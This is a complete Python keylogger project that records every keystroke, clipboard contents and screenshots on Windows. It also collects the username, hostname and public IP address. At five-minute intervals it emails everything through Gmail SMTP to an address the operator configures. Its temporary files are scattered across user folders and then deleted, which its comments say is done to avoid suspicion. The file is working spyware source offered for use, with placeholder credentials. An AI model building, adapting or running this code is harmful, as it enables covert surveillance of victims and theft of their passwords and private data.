# PYTHON PROJECT
# Advanced KeyLogger using Python

# Logs the KeyStrokes, checks for any copied content in 
# the clipboard, and takes the screenshot of the screen.

# Author: Atharva Mahendra Belekar
# --------------------------------------------------------------------------------------------------------------------- #

# importing libraries

# to send email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# to gain system information
import socket
import requests
import platform
import os
import random

# for clicking a screenshot & to check clipboard content
from PIL import ImageGrab
import win32clipboard

# for monitoring the keyboard
from pynput.keyboard import Key, Listener
import threading



# fetch the username
user = os.path.expanduser('~').split('\\')[2]
# get the private IP address of the host
privateIP = socket.gethostbyname(socket.gethostname())

# default_msg stores all the system and user information that is inserted at the beginning of the log file
default_msg = f" [***** LOG FILE *****]\n # User-Profile: {user}\n # Processor: {platform.processor()}\n # System: {platform.system()} {platform.version()}\n # Machine: {platform.machine()}\n # Hostname: {socket.gethostname()}\n # Private IP: {privateIP}\n"
try:
    # get the public IP address of the host
    publicIP = requests.get('https://api.ipify.org/').text
    default_msg = default_msg + f" # Public IP: {publicIP}\n\n\n"
except:
    default_msg = default_msg + "\n\n"
    pass

# logged_data consists of the key-strokes
logged_data = []
logged_data.append(default_msg)

# delete_file consists the list of files to be sent as an attachment to the email, which will later be permanently deleted from the system to avoid suspicion
delete_file = []

# credentials for email log in
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_password OR Token"
# interval between every log sent (adjust accordingly)
REPORT_EVERY = 300  # 300 => 300/60 = 5 minutes 

# to monitor count of logs captured
count = 0



# the callback to call when a button is pressed
def on_press(key):
    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]',
    '\\x18', '[CTRL-X]', '\\x1a', '[CTRL-Z]', '\\x19', '[CTRL-Y]', '\\x13', '[CTRL-S]']
    
    key = str(key).strip("'")
    if key in substitution:
        logged_data.append(substitution[substitution.index(key) + 1])
    else:
        logged_data.append(key)


# the callback to call when a button is released
def on_release(key):
    # this script will terminate after clicking 'ESC'
    if key == Key.esc:
        return False


# function to send email using SMTP protocol over Gmail PORT no. 587
def send_email():
    subject = f"[{user}] ~ Logs"
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS
    msg['Subject'] = subject
    body = 'Advanced Keylogger\n\nPFA:\n\t1) Log File\n\t2) Clipboard Data\n\t3) Current Screenshot\n'
    msg.attach(MIMEText(body, 'plain'))
    
    # attaching all the files
    for file in delete_file:
        filename = file.split('/')[2]
        attachment = open(file, 'rb')
        
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('content-disposition', 'attachment;filename='+str(filename))
        msg.attach(p)
    
    text = msg.as_string()
    
    # create a connection to the SMTP server
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    # connect to SMTP server as TLS mode (for security)
    server.starttls()
    server.ehlo()
    # login to the Gmail account
    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    # send the email
    server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, text)
    
    # terminate the server and close the file handler
    attachment.close()
    server.quit()


# this method will help generate the files at random locations. You can add more file paths
def random_file_path():
    one = os.path.expanduser('~') + '/Downloads/'
    two = os.path.expanduser('~') + '/Music/'
    three = os.path.expanduser('~') + '/Documents/'
    
    # you can see the file generated at one of these paths and later get deleted
    list = [one, two, three]
    filepath = random.choice(list)
    
    return filepath


# method to fetch data from clipboard using win32clipboard module
def clipboard():
    filepath = random_file_path()
    filename = str(count) + 'l' + str(random.randint(1000000000, 9999999999)) + '.txt'
    
    file = filepath + filename
    delete_file.append(file)
    
    with open(file, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            copied_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            f.write('[##### Clipboard Data #####]\n\n' + copied_data)
            
        except:
            f.write('[Clipboard Data either empty or could not be copied.]')


# this method captures a screenshot of the screen at the time of sending the log
def screenshot():
    filepath = random_file_path()
    filename = str(count) + 'l' + str(random.randint(1000000000, 9999999999)) + '.png' # note the .png extension for image
    
    file = filepath + filename
    delete_file.append(file)
    
    im = ImageGrab.grab()
    im.save(file)
     

# this method creates a log file for key-strokes
def log_file():
    filepath = random_file_path()
    filename = str(count) + 'l' + str(random.randint(1000000000, 9999999999)) + '.txt'
    
    file = filepath + filename
    delete_file.append(file)
    
    with open(file, 'w') as f:
        f.write(''.join(logged_data))


# method to send the log files after REPORT_EVERY time interval
def send_logs():
    global count
    
    if len(logged_data) > 1:
        try:
            # generate the log files
            log_file()
            clipboard()
            screenshot()
            
            # send email
            send_email()
            
        except:
            # uncomment the line below for debugging
            # print('[-] Error in creating log files OR Error in sending email\n')
            pass

    # delete all the files permanently
    for file in delete_file:
        os.remove(file)
    
    # reset the variables / clear the logged content for next interval
    del logged_data[1:]
    del delete_file[0:]
    
    count += 1
    
    timer = threading.Timer(interval=REPORT_EVERY, function=send_logs)
    # set the thread daemon so that the thread terminates after 'main' terminates
    timer.daemon = True
    timer.start()


# main function
if __name__ == '__main__':
    send_logs()
    
    # A listener for keyboard events
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    # to permanently delete any residual files
    for file in delete_file:
        os.remove(file)
        
    
    
    
